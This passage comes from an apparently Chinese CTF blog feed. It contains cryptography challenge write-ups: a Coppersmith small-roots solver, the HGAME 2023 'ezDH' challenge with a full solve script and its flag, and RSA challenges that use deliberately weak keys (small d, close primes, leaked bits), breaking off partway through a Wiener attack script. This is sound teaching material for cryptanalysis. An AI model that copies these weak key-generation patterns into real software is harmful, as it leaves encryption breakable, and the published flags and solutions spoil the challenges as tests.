class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">R.&lt;x,y&gt;=Zmod(p)[]</span><br><span class="line">f=(r1-r2)*(d1+x)*(d2+y)-(d2+y-d1-x)</span><br><span class="line">x,y=small_roots(f,bounds=(<span class="number">2</span>^<span class="number">246</span>,<span class="number">2</span>^<span class="number">246</span>),m=<span class="number">1</span>,d=<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">secret=gmpy2.invert((d1+<span class="built_in">int</span>(x)),p)-r1</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NTg0OTAwMg==&mid=2247484028&idx=1&sn=1b363e9480e3f7b1499e18a7d532ca15&chksm=cf3a7639f84dff2f3119e60ed51fe2a6f0dcd04ae6e079083e906b25d4c2c95133f4aa69d9ba&mpshare=1&scene=23&srcid=02039HQVkzrWMBdGAEmDPEEw&sharer_sharetime=1675431115842&sharer_shareid=4c7f5e21d9195990be9cc01a3b73900f#rd">西湖论剑·2022中国杭州网络安全技能大赛-初赛 部分WriteUp (qq.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> match </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 hgame week2 Crypto篇wp</title>
      <link href="/2023/01/31/2023%20hgame%20week3%20Crypto%E7%AF%87wp/"/>
      <url>/2023/01/31/2023%20hgame%20week3%20Crypto%E7%AF%87wp/</url>
      
        <content type="html"><![CDATA[<h1 id="ezDH"><a href="#ezDH" class="headerlink" title="ezDH"></a>ezDH</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> Alice_secret, Bob_secret, FLAG</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N=<span class="number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">A = power_mod(g, Alice_secret, N)</span><br><span class="line">f.write(<span class="string">&quot;Alice send to Bob: &#123;&#123; &#x27;g&#x27;: &#123;g&#125;, &#x27;A&#x27;: &#123;A&#125; &#125;&#125;\n&quot;</span>.<span class="built_in">format</span>(g=g, A=<span class="built_in">hex</span>(A)))</span><br><span class="line">B = power_mod(g, Bob_secret, N)</span><br><span class="line">f.write(<span class="string">&quot;Bob send to Alice: &#123;&#123;&#x27;B&#x27;: &#123;B&#125; &#125;&#125;\n&quot;</span>.<span class="built_in">format</span>(B=<span class="built_in">hex</span>(B)))</span><br><span class="line"></span><br><span class="line">shared_secret = <span class="built_in">pow</span>(A, Bob_secret, N)</span><br><span class="line"></span><br><span class="line">p=<span class="number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span></span><br><span class="line">a=-<span class="number">3</span></span><br><span class="line">b=<span class="number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E.random_point()</span><br><span class="line">Pa = shared_secret * G</span><br><span class="line">f.write(<span class="string">f&quot;Alice send to Bob: &#123;&#123; &#x27;E&#x27;: <span class="subst">&#123;E&#125;</span>, &#x27;G&#x27;: <span class="subst">&#123;G.xy()&#125;</span>, &#x27;Pa&#x27;: <span class="subst">&#123;Pa.xy()&#125;</span> &#125;&#125;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">k = random.randint(<span class="number">2</span>, p)</span><br><span class="line">m = E.lift_x(Integer(bytes_to_long(FLAG)))</span><br><span class="line">P1 = k * G</span><br><span class="line">P2 = k * Pa</span><br><span class="line">c = m + P2</span><br><span class="line">f.write(<span class="string">f&quot;Bob send to Alice: &#123;&#123; <span class="subst">&#123;P1.xy()&#125;</span>, <span class="subst">&#123;c.xy()&#125;</span> &#125;&#125;\n&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Alice send to Bob: &#123; &#x27;g&#x27;: 2, &#x27;A&#x27;: 0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833 &#125;</span><br><span class="line">Bob send to Alice: &#123;&#x27;B&#x27;: 0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510dde &#125;</span><br><span class="line">Alice send to Bob: &#123; &#x27;E&#x27;: Elliptic Curve defined by y^2 = x^3 + 6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057148*x + 1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984 over Finite Field of size 6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151, &#x27;G&#x27;: (6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915, 3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206), &#x27;Pa&#x27;: (2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698, 1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773) &#125;</span><br><span class="line">Bob send to Alice: &#123; (2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647, 3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868), (6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522, 6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395) &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>首先阅读代码，理清思路：</p><blockquote><p>A = power_mod(g, Alice_secret, N)</p><p>B = power_mod(g, Bob_secret, N)</p><p>shared_secret = pow(A, Bob_secret, N)</p><p>考察离散对数求解问题，我们可以在sagemath中使用factor(N-1)验证n-1的光滑性，可以直接使用discrete_log来得到Bob_secret和shared_secret</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sage: N=0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a</span><br><span class="line">....: 79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span><br><span class="line">sage: factor(N-1)</span><br><span class="line">2^23 * 3^26 * 5^12 * 7^7 * 11 * 13^3 * 17^2 * 19 * 23 * 29 * 31 * 41 * 43^4 * 53 * 61 * 83 * 89 * 109 * 127 * 157 * 173 * 181 * 199 * 293 * 337 * 367 * 457^2 * 503 * 547 * 677 * 839 * 853 * 1471 * 1559 * 1709 * 2437 * 2843 * 3359 * 3433 * 3541 * 3637 * 9403 * 15443 * 20533 * 27437 * 34033 * 51059 * 51613 * 59123 * 65839 * 149027 * 199873 * 344251 * 470593 * 675299 * 702523 * 2727331 * 3745229 * 4260649 * 5782171 * 6020923 * 11461381 * 15571799 * 16397737 * 17406901 * 18964541 * 25576627 * 45916289 * 161557391 * 176006951 * 236232461 * 290156021 * 503554679 * 1580641753 * 1816545361</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在得到shared_secret后</p>$c=m+p_2=m+k*P_a=m+k*shared\_secret*G=m+shared\_secret*P_1$<p>已知$c,shared\_secret,P_1$,</p><p>带入求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">N = <span class="number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">A = <span class="number">0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833</span></span><br><span class="line">B = <span class="number">0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510dde</span></span><br><span class="line"></span><br><span class="line">b = discrete_log(mod(B,N),mod(g,N))</span><br><span class="line">s = <span class="built_in">int</span>(<span class="built_in">pow</span>(A,b,N))</span><br><span class="line">p = <span class="number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span></span><br><span class="line">a = -<span class="number">3</span></span><br><span class="line">b = <span class="number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">G = E(<span class="number">6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915</span>, <span class="number">3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206</span>)</span><br><span class="line">Pa = E(<span class="number">2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698</span>, <span class="number">1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773</span>)</span><br><span class="line">P1 = E(<span class="number">2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647</span>, <span class="number">3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868</span>)</span><br><span class="line">c = E(<span class="number">6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522</span>, <span class="number">6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395</span>)</span><br><span class="line">P=s*P1</span><br><span class="line"></span><br><span class="line">m = c - P</span><br><span class="line">x,y=m.xy()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(Integer(x)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Weak_p@ramet3r_make_DHKE_broken&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="RSA-大冒险2"><a href="#RSA-大冒险2" class="headerlink" title="RSA 大冒险2"></a>RSA 大冒险2</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><blockquote><p>好耶，又是大冒险！</p><p>HINTS:</p><p>Challenge 3: p泄漏的位数不够多，导致coppersmith方法解不出来，那么有没有什么办法能够扩大coppersmith的界呢？注意coppersmith方法使用了LLL算法，那么这个界和格基又有什么关系呢？</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge1.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall1_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">create_keypair</span>(<span class="params">size</span>):</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                p = getPrime(size // <span class="number">2</span>)</span><br><span class="line">                q = getPrime(size // <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">if</span> q &lt; p &lt; <span class="number">2</span>*q:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            max_d = isqrt(isqrt(N)) // <span class="number">3</span></span><br><span class="line">            max_d_bits = max_d.bit_length() - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                d = getRandomNBitInteger(max_d_bits)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    e = <span class="built_in">int</span>(inverse(d, phi))</span><br><span class="line">                <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (e * d) % phi == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">return</span> N, e, d</span><br><span class="line">        self.N, self.e, self.d = create_keypair(<span class="number">1024</span>)</span><br><span class="line">        self.m = chall1_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_ ,self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># challenge2.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall2_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_prime</span>(<span class="params">p</span>):</span><br><span class="line">    k=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime(p+k):</span><br><span class="line">            <span class="keyword">return</span> p+k</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">creat_keypair</span>(<span class="params">nbits, beta</span>):</span><br><span class="line">            p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            q = next_prime(p+getRandomNBitInteger(<span class="built_in">int</span>(nbits*beta)))</span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                e = getRandomNBitInteger(<span class="number">16</span>)</span><br><span class="line">                <span class="keyword">if</span> GCD(e, phi) == <span class="number">2</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            <span class="keyword">return</span> N, e, d</span><br><span class="line">        self.N, self.e, self.d = creat_keypair(<span class="number">1024</span>, <span class="number">0.25</span>)</span><br><span class="line">        self.m = chall2_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># challenge3.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall3_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">create_keypair</span>(<span class="params">nbits</span>):</span><br><span class="line">            p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            N = p*q</span><br><span class="line">            phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            e = <span class="number">65537</span></span><br><span class="line">            d = inverse(e, phi)</span><br><span class="line">            leak = p &gt;&gt; <span class="number">253</span></span><br><span class="line">            <span class="keyword">return</span> N, e, d, leak</span><br><span class="line">        self.N, self.e, self.d, self.leak = create_keypair(<span class="number">1024</span>)</span><br><span class="line">        self.m = chall3_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.N)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;N&quot;</span>:self.N, <span class="string">&quot;e&quot;</span>:self.e, <span class="string">&quot;leak&quot;</span>:self.leak&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>e较大，尝试维纳攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n=<span class="number">130719978302979988299486605831276036274712384408180757097228805727507001127527934189781259524374063789749575222393601540514521324024302937249596498783369562670211175655782542995675204468640361856200294853347960161877299875493675891670765102890817716799877524694778905625244140845206856872228519505623754451149</span></span><br><span class="line">e=<span class="number">65421446571536388693675481990160095538813032230161701323215704610743345415118104588039055528481192585109771401139532745886431072759334482993157707665241532778947560790628197933677606454484367030476540982499113347474102249372724426249898844154861224788978060803217189574717838144916708075237656886825932638827</span></span><br><span class="line">c=<span class="number">0x4452c890cfb05281cb946aec129ddbfc83c5ec3ca8baaca921ea98b322447af9a221d96dbe5bf0d1a7e842d9a548308fa0068c0665284846b3caad426112355fe7bc67c4bc8befb08207b646c6ad765c2cde9a36cc95418c7f33db9b8790f5e1fa9eb30e4229270329e51c41ceb3019518eb2d7afe8c2065211c09c5a86ff1e3</span></span><br><span class="line"><span class="comment"># numerator(n):分子, denominator(d)：分母</span></span><br><span class="line"><span class="keyword">def</span> <span class="title 